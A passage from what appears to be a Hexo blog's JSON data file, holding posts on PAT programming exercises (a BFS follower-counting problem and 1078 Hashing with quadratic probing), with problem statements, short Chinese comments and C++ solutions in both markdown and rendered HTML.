as well. Hence a social network is formed with followers relations. When a user makes a post on Weibo, all his/her followers can view and forward his/her post, which can then be forwarded again by their followers. Now given a social network, you are supposed to calculate the maximum potential amount of forwards for any specific user, assuming that only L levels of indirect followers are counted.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains 2 positive integers: N (&lt;=1000), the number of users; and L (&lt;=6), the number of levels of indirect followers that are counted. Hence it is assumed that all the users are numbered from 1 to N. Then N lines follow, each in the format:</p>\n<p>M[i] user_list[i]</p>\n<p>where M[i] (&lt;=100) is the total number of people that user[i] follows; and user_list[i] is a list of the M[i] users that are followed by user[i]. It is guaranteed that no one can follow oneself. All the numbers are separated by a space.</p>\n<p>Then finally a positive K is given, followed by K UserID’s for query.</p>\n<p>Output Specification:</p>\n<p>For each UserID, you are supposed to print in one line the maximum potential amount of forwards this user can triger, assuming that everyone who can view the initial post will forward it once, and that only L levels of indirect followers are counted.</p>\n<p>Sample Input:<br>7 3<br>3 2 3 4<br>0<br>2 5 6<br>2 3 1<br>2 3 4<br>1 4<br>1 5<br>2 2 6</p>\n<p>Sample Output:<br>4<br>5</p>\n</blockquote>\n<p>哇，难得的一次过233。。。BFS</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;limits&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = (<span class=\"number\">1e3</span> + <span class=\"number\">10</span>) + <span class=\"number\">1</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> n, l;</div><div class=\"line\"><span class=\"keyword\">int</span> m[maxN][maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> lay[maxN];</div><div class=\"line\"><span class=\"keyword\">bool</span> vis[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> x, y;</div><div class=\"line\"><span class=\"keyword\">int</span> p;</div><div class=\"line\"><span class=\"keyword\">int</span> ans[maxN];</div><div class=\"line\"><span class=\"built_in\">queue</span>&lt;<span class=\"keyword\">int</span>&gt; q;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bfs</span><span class=\"params\">(<span class=\"keyword\">int</span> root, <span class=\"keyword\">int</span> l)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> w; <span class=\"keyword\">int</span> flag = <span class=\"number\">1</span>; <span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; maxN; i++)</div><div class=\"line\">\t\tvis[i] = <span class=\"literal\">false</span>;</div><div class=\"line\">\tq.push(root);</div><div class=\"line\">\tvis[root] = <span class=\"literal\">true</span>;</div><div class=\"line\">\tlay[root] = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (!q.empty())</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tflag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\troot = q.front();</div><div class=\"line\">\t\tq.pop();</div><div class=\"line\">\t\tw = m[root][flag];</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (w)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (!vis[w])</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tvis[w] = <span class=\"literal\">true</span>;</div><div class=\"line\">\t\t\t\t\tlay[w] = lay[root] + <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t\tq.push(w);</div><div class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (lay[w] &lt;= l )</div><div class=\"line\">\t\t\t\t\t\tans++;</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\tflag++;</div><div class=\"line\">\t\t\t\tw = m[root][flag];</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> ans;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;n, &amp;l);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt;= x; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y);</div><div class=\"line\">\t\t\tm[y][++m[y][<span class=\"number\">0</span>]] = i;</div><div class=\"line\">\t\t\t<span class=\"comment\">//m[i][j] = y;</span></div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;p);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= p; i++)</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;ans[i]);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= p; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, bfs(ans[i], l));</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1078","date":"2017-02-20T04:30:58.000Z","_content":"\n## Description\n\n> 1078.Hashing\n\n> The task of this problem is simple: insert a sequence of distinct positive integers into a hash table, and output the positions of the input numbers. The hash function is defined to be \"H(key) = key % TSize\" where TSize is the maximum size of the hash table. Quadratic probing (with positive increments only) is used to solve the collisions.\n\n> Note that the table size is better to be prime. If the maximum size given by the user is not prime, you must re-define the table size to be the smallest prime number which is larger than the size given by the user.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains two positive numbers: MSize (<=104) and N (<=MSize) which are the user-defined table size and the number of input numbers, respectively. Then N distinct positive integers are given in the next line. All the numbers in a line are separated by a space.\n\n> Output Specification:\n\n> For each test case, print the corresponding positions (index starts from 0) of the input numbers in one line. All the numbers in a line are separated by a space, and there must be no extra space at the end of the line. In case it is impossible to insert the number, print \"-\" instead.\n\n> Sample Input:\n4 4\n10 6 4 15\n\n> Sample Output:\n0 1 4 -\n\n看书好长一段，看看被人的代码一下就懂了，QAQ\n二次方探查就是用`(x + i * i) % Tsize`这么个东西吧。。\n哦，想起来个注释小技巧，这样写`/*···············//*/`，去掉注释删除前一个`/*`即可\n\n## Code\n\n```\n#include<cstdio>\n#include<cmath>\n#include<iostream>\n#include<map>\n#include<string>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxS = 1e4 + 10;\n\nint m, n;\nint t[maxS] = {0};\nint x;\n\nbool prime(int x)\n{\n\tif (x == 1)\n\t\treturn false;\n\tif (x == 2)\n\t\treturn true;\n\tif (x == 3)\n\t\treturn true;\n\tfor (int i = 2; i < sqrt(x) + 1; i++)\n\t\tif (x % i == 0)\n\t\t\treturn false;\n\treturn true;\n}\n\nint findp(int x)\n{\n\tfor (int i = x + 1;; i++)\n\t\tif (prime(i))\n\t\t\treturn i;\n}\n//*/\n\nint main()\n{\n\tscanf(\"%d%d\", &m, &n);\n\t\n\tif (!prime(m))\n\t\tm = findp(m);\n\n\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tscanf(\"%d\", &x);\n\t\tint flag = 0;\n\t\tif (i) printf(\" \");\n\t\tfor (int i = 0; i < m; i++)\n\t\t{\n\t\t\tint y = (x + i * i) % m;\n\t\t\tif (!t[y])\n\t\t\t{\n\t\t\t\tprintf(\"%d\", y);\n\t\t\t\tt[y] = 1;\n\t\t\t\tflag = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (!flag) printf(\"-\");\n\t}\n\t//*/\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1078.md","raw":"---\ntitle: PAT advanced 1078\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-20 12:30:58\n---\n\n## Description\n\n> 1078.Hashing\n\n> The task of this problem is simple: insert a sequence of distinct positive integers into a hash table, and output the positions of the input numbers. The hash function is defined to be \"H(key) = key % TSize\" where TSize is the maximum size of the hash table. Quadratic probing (with positive increments only) is used to solve the collisions.\n\n> Note that the table size is better to be prime. If the maximum size given by the user is not prime, you must re-define the table size to be the smallest prime number which is larger than the size given by the user.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains two positive numbers: MSize (<=104) and N (<=MSize) which are the user-defined table size and the number of input numbers, respectively. Then N distinct positive integers are given in the next line. All the numbers in a line are separated by a space.\n\n> Output Specification:\n\n> For each test case, print the corresponding positions (index starts from 0) of the input numbers in one line. All the numbers in a line are separated by a space, and there must be no extra space at the end of the line. In case it is impossible to insert the number, print \"-\" instead.\n\n> Sample Input:\n4 4\n10 6 4 15\n\n> Sample Output:\n0 1 4 -\n\n看书好长一段，看看被人的代码一下就懂了，QAQ\n二次方探查就是用`(x + i * i) % Tsize`这么个东西吧。。\n哦，想起来个注释小技巧，这样写`/*···············//*/`，去掉注释删除前一个`/*`即可\n\n## Code\n\n```\n#include<cstdio>\n#include<cmath>\n#include<iostream>\n#include<map>\n#include<string>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxS = 1e4 + 10;\n\nint m, n;\nint t[maxS] = {0};\nint x;\n\nbool prime(int x)\n{\n\tif (x == 1)\n\t\treturn false;\n\tif (x == 2)\n\t\treturn true;\n\tif (x == 3)\n\t\treturn true;\n\tfor (int i = 2; i < sqrt(x) + 1; i++)\n\t\tif (x % i == 0)\n\t\t\treturn false;\n\treturn true;\n}\n\nint findp(int x)\n{\n\tfor (int i = x + 1;; i++)\n\t\tif (prime(i))\n\t\t\treturn i;\n}\n//*/\n\nint main()\n{\n\tscanf(\"%d%d\", &m, &n);\n\t\n\tif (!prime(m))\n\t\tm = findp(m);\n\n\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tscanf(\"%d\", &x);\n\t\tint flag = 0;\n\t\tif (i) printf(\" \");\n\t\tfor (int i = 0; i < m; i++)\n\t\t{\n\t\t\tint y = (x + i * i) % m;\n\t\t\tif (!t[y])\n\t\t\t{\n\t\t\t\tprintf(\"%d\", y);\n\t\t\t\tt[y] = 1;\n\t\t\t\tflag = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (!flag) printf(\"-\");\n\t}\n\t//*/\n\treturn 0;\n}\n```","slug":"PAT-advanced-1078","published":1,"updated":"2017-02-20T04:36:37.784Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k0p002mhv18m7lxsphq","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1078.Hashing</p>\n<p>The task of this problem is simple: insert a sequence of distinct positive integers into a hash table, and output the positions of the input numbers. The hash function is defined to be “H(key) = key % TSize” where TSize is the maximum size of the hash table. Quadratic probing (with positive increments only) is used to solve the collisions.</p>\n<p>Note that the table size is better to be prime. If the maximum size given by the user is not prime, you must re-define the table size to be the smallest prime number which is larger than the size given by the user.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains two positive numbers: MSize (&lt;=104) and N (&lt;=MSize) which are the user-defined table size and the number of input numbers, respectively. Then N distinct positive integers are given in the next line. All the numbers in a line are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, print the corresponding positions (index starts from 0) of the input numbers in one line. All the numbers in a line are separated by a space, and there must be no extra space at the end of the line. In case it is impossible to insert the number, print “-“ instead.</p>\n<p>Sample Input:<br>4 4<br>10 6 4 15</p>\n<p>Sample Output:<br>0 1 4 -</p>\n</blockquote>\n<p>看书好长一段，看看被人的代码一下就懂了，QAQ<br>二次方探查就是用<code>(x + i * i) % Tsize</code>这么个东西吧。。<br>哦，想起来个注释小技巧，这样写<code>/*···············//*/</code>，去掉注释删除前一个<code>/*</code>即可</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;map&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxS = <span class=\"number\">1e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> m, n;</div><div class=\"line\"><span class=\"keyword\">int</span> t[maxS] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"><span class=\"keyword\">int</span> x;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">prime</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (x == <span class=\"number\">1</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (x == <span class=\"number\">2</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (x == <span class=\"number\">3</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">2</span>; i &lt; <span class=\"built_in\">sqrt</span>(x) + <span class=\"number\">1</span>; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (x % i == <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">findp</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = x + <span class=\"number\">1</span>;; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (prime(i))</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> i;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"comment\">//*/</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;m, &amp;n);</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!prime(m))</div><div class=\"line\">\t\tm = findp(m);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (i) <span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">int</span> y = (x + i * i) % m;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!t[y])</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, y);</div><div class=\"line\">\t\t\t\tt[y] = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\tflag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (!flag) <span class=\"built_in\">printf</span>(<span class=\"string\">\"-\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"comment\">//*/</span></div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1078.Hashing</p>\n<p>The task of this problem is simple: insert a sequence of distinct positive integers into a hash table, and output the positions of the input numbers. The hash function is defined to be “H(key) = key % TSize” where TSize is the maximum size of the hash table. Quadratic probing (with positive increments only) is used to solve the collisions.</p>\n<p>Note that the table size is better to be prime. If the maximum size given by the user is not prime, you must re-define the table size to be the smallest prime number which is larger than the size given by the user.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains two positive numbers: MSize (&lt;=104) and N (&lt;=MSize) which are the user-defined table size and the number of input numbers, respectively. Then N distinct positive integers are given in the next line. All the numbers in a line are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, print the corresponding positions (index starts from 0) of the input numbers in one line. All the numbers in a line are separated by a space, and there must be no extra space at the end of the line. In case it is impossible to insert the number, print “-“ instead.</p>\n<p>Sample Input:<br>4 4<br>10 6 4 15</p>\n<p>Sample Output:<br>0 1 4 -</p>\n</blockquote>\n<p>看书好长一段，看看被人的代码一下就懂了，QAQ<br>二次方探查就是用<code>(x + i * i) % Tsize</code>这么个东西吧。。<br>哦，想起来个注释小技巧，这样写<code>/*···············//*/</code>，去掉注释删除前一个<code>/*</code>即可</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;map&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxS = <span class=\"number\">1e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> m, n;</div><div class=\"line\"><span class=\"keyword\">int</span> t[maxS] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"><span class=\"keyword\">int</span> x;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">prime</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (x == <span class=\"number\">1</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (x == <span class=\"number\">2</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (x == <span class=\"number\">3</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">2</span>; i &lt; <span class=\"built_in\">sqrt</span>(x) + <span class=\"number\">1</span>; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (x % i == <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">findp</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = x + <span class=\"number\">1</span>;; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (prime(i))</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> i;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"comment\">//*/</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;m, &amp;n);</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!prime(m))</div><div class=\"line\">\t\tm = findp(m);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t<span 